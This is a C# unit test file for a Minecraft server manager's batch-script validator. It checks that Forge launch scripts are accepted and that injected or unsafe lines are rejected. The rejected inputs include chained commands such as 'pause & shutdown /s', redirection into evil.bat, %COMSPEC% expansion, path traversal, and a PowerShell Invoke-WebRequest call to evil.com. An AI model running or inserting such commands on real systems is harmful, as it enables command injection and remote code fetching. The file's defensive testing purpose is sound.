using MinecraftServerManager.Infrastructure.Servers;
using Xunit;

namespace MinecraftServerManager.UnitTests;

public sealed class SafeScriptValidatorTests
{
    [Theory]
    [InlineData("@echo off & calc.exe")]
    [InlineData("echo off | evil.exe")]
    [InlineData("rem comment > evil.bat")]
    [InlineData("title safe < evil.txt")]
    [InlineData("@echo off ^& calc.exe")]
    [InlineData("pause & shutdown /s")]
    [InlineData("chcp 65001 & notepad")]
    [InlineData("chcp 65001 > evil.bat")]
    [InlineData("chcp 65001 >> evil.txt")]
    [InlineData("chcp 65001 & calc > nul")]
    public void RejectsCommandChainingAndRedirectionEvenWithSafePrefix(string maliciousLine)
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "run.bat");
            File.WriteAllText(script, maliciousLine);

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Theory]
    [InlineData("echo !PATH!")]
    [InlineData("java %COMSPEC%")]
    [InlineData("java -jar %USERPROFILE%\\server.jar")]
    public void RejectsUnsafeVariableExpansion(string unsafeLine)
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "run.bat");
            File.WriteAllText(script, unsafeLine);

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Fact]
    public void RejectsPathTraversalInScript()
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "run.bat");
            File.WriteAllText(script, "java @..\\outside.txt\r\n");

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Fact]
    public void RejectsNonWhitelistedCommands()
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "run.bat");
            File.WriteAllText(script, "powershell -Command Invoke-WebRequest http://evil.com\r\n");

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Fact]
    public void AcceptsValidForgeAndNeoForgeLaunchScripts()
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "run.bat");
            string validContent = """
                REM Forge server start script
                @echo off
                chcp 65001
                cd /d "%~dp0"
                "C:\Program Files\Java\jdk-21\bin\java.exe" @user_jvm_args.txt @libraries/net/minecraftforge/forge/1.20.1/win_args.txt %*
                pause
                """;
            File.WriteAllText(script, validContent);

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.True(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Theory]
    [InlineData("chcp 65001 > nul")]
    [InlineData("chcp 65001 >nul")]
    [InlineData("@chcp 65001 > nul")]
    public void AcceptsChcpNulRedirection(string chcpLine)
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "start_server.bat");
            string content = $"""
                @echo off
                {chcpLine}
                cd /d "%~dp0"
                "C:\Java\bin\java.exe" -Xms1024M -Xmx2048M -jar "server.jar" nogui %*
                """;
            File.WriteAllText(script, content);

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.True(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Theory]
    [InlineData("java -jar server.jar")]
    [InlineData("\"java\" -jar server.jar")]
    [InlineData("java.exe -jar server.jar")]
    [InlineData("\"java.exe\" -jar server.jar")]
    public void RejectsUnqualifiedJavaCommands(string unqualifiedCommand)
    {
        string dir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(dir, "unqualified.bat");
            string content = $"""
                @echo off
                cd /d "%~dp0"
                {unqualifiedCommand}
                """;
            File.WriteAllText(script, content);

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    [Fact]
    public void RejectsScriptOutsideServerDirectory()
    {
        string dir = CreateTempDirectory();
        string outsideDir = CreateTempDirectory();
        try
        {
            string script = Path.Combine(outsideDir, "outside.bat");
            File.WriteAllText(script, "@echo off\r\njava -jar server.jar\r\n");

            bool isValid = SafeScriptValidator.ValidateScriptContent(script, dir);

            Assert.False(isValid);
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
            Directory.Delete(outsideDir, recursive: true);
        }
    }

    private static string CreateTempDirectory()
    {
        string path = Path.Combine(Path.GetTempPath(), "msm-test-script-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(path);
        return path;
    }
}
